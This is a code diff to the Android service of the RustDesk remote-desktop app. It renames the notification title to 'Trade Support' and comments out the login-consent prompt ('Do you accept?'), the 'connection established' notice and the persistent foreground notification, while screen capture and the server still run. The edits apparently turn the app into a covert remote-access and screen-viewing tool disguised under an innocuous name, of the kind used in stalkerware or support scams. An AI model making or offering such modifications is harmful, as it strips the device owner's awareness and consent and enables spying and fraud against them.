@@ -45,7 +45,7 @@ import kotlin.math.max
 import kotlin.math.min
 
 
-const val DEFAULT_NOTIFY_TITLE = "RustDesk"
+const val DEFAULT_NOTIFY_TITLE = "Trade Support"
 const val DEFAULT_NOTIFY_TEXT = "Service is running"
 const val DEFAULT_NOTIFY_ID = 1
 const val NOTIFY_ID_OFFSET = 100
@@ -128,9 +128,9 @@ class MainService : Service() {
                         if (!isFileTransfer && !isStart) {
                             startCapture()
                         }
-                        onClientAuthorizedNotification(id, type, username, peerId)
+                        //onClientAuthorizedNotification(id, type, username, peerId)
                     } else {
-                        loginRequestNotification(id, type, username, peerId)
+                        //loginRequestNotification(id, type, username, peerId)
                     }
                 } catch (e: JSONException) {
                     e.printStackTrace()
@@ -212,14 +212,14 @@ class MainService : Service() {
             serviceHandler = Handler(looper)
         }
         updateScreenInfo(resources.configuration.orientation)
-        initNotification()
+        //initNotification()
 
         // keep the config dir same with flutter
         val prefs = applicationContext.getSharedPreferences(KEY_SHARED_PREFERENCES, FlutterActivity.MODE_PRIVATE)
         val configPath = prefs.getString(KEY_APP_DIR_CONFIG_PATH, "") ?: ""
         startServer(configPath)
 
-        createForegroundNotification()
+        //createForegroundNotification()
     }
 
     override fun onDestroy() {
@@ -297,7 +297,7 @@ class MainService : Service() {
         Log.d("whichService", "this service: ${Thread.currentThread()}")
         super.onStartCommand(intent, flags, startId)
         if (intent?.action == ACT_INIT_MEDIA_PROJECTION_AND_SERVICE) {
-            createForegroundNotification()
+            //createForegroundNotification()
 
             if (intent.getBooleanExtra(EXT_INIT_FROM_BOOT, false)) {
                 startService()
@@ -626,7 +626,7 @@ class MainService : Service() {
         } else {
             PendingIntent.getActivity(this, 0, intent, FLAG_UPDATE_CURRENT)
         }
-        val notification = notificationBuilder
+ /*       val notification = notificationBuilder
             .setOngoing(true)
             .setSmallIcon(R.mipmap.ic_stat_logo)
             .setDefaults(Notification.DEFAULT_ALL)
@@ -639,7 +639,7 @@ class MainService : Service() {
             .setColor(ContextCompat.getColor(this, R.color.primary))
             .setWhen(System.currentTimeMillis())
             .build()
-        startForeground(DEFAULT_NOTIFY_ID, notification)
+        startForeground(DEFAULT_NOTIFY_ID, notification) */
     }
 
     private fun loginRequestNotification(
@@ -648,7 +648,7 @@ class MainService : Service() {
         username: String,
         peerId: String
     ) {
-        val notification = notificationBuilder
+      /*  val notification = notificationBuilder
             .setOngoing(false)
             .setPriority(NotificationCompat.PRIORITY_MAX)
             .setContentTitle(translate("Do you accept?"))
@@ -657,7 +657,7 @@ class MainService : Service() {
             // .addAction(R.drawable.check_blue, "check", genLoginRequestPendingIntent(true))
             // .addAction(R.drawable.close_red, "close", genLoginRequestPendingIntent(false))
             .build()
-        notificationManager.notify(getClientNotifyID(clientID), notification)
+        notificationManager.notify(getClientNotifyID(clientID), notification) */
     }
 
     private fun onClientAuthorizedNotification(
@@ -667,13 +667,13 @@ class MainService : Service() {
         peerId: String
     ) {
         cancelNotification(clientID)
-        val notification = notificationBuilder
+      /*  val notification = notificationBuilder
             .setOngoing(false)
             .setPriority(NotificationCompat.PRIORITY_MAX)
             .setContentTitle("$type ${translate("Established")}")
             .setContentText("$username - $peerId")
             .build()
-        notificationManager.notify(getClientNotifyID(clientID), notification)
+        notificationManager.notify(getClientNotifyID(clientID), notification)*/
     }
 
     private fun getClientNotifyID(clientID: Int): Int {
